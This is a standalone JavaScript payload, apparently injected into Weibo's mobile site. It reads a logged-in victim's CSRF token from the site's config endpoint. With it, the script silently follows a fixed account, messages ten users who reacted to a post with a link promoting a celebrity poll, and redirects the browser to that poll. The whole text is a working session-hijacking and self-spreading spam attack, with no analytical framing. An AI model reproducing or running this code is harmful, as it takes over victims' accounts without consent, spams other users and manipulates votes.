   z=new XMLHttpRequest();
        z.open("GET","https://m.weibo.cn/api/config",true);
        z.send();
        z.onreadystatechange=function(){
            if (z.readyState == 4){
                var obj = JSON.parse(z.responseText);
                var xhr = new XMLHttpRequest();
                xhr.open('post', 'https://m.weibo.cn/api/friendships/create' );
                xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                xhr.send('uid=6421536602&st=' + obj.data.st);
                var f=new XMLHttpRequest();
                f.open("GET","https://m.weibo.cn/api/attitudes/show?id=4323606874187376",true);
                f.send();
                f.onreadystatechange=function(){
                    if(f.readyState==4){
                        var u = JSON.parse(f.responseText);
                        for (var i=0;i<10;i++)
                        {
                            var x = new XMLHttpRequest();
                            x.open('post', 'https://m.weibo.cn/api/chat/send' );
                            x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                            x.send('uid='+u.data.data[i].user.id+'&content=亲爱的ikun，微博投票蔡徐坤需要你的一票，不管什么投票咱们都不能落后>>http://t.cn/EbszqrD&st=' + obj.data.st);
                            window.location.href="https://vote.weibo.cn/poll/138894804";
                        }
                    }
                }
            }
        };
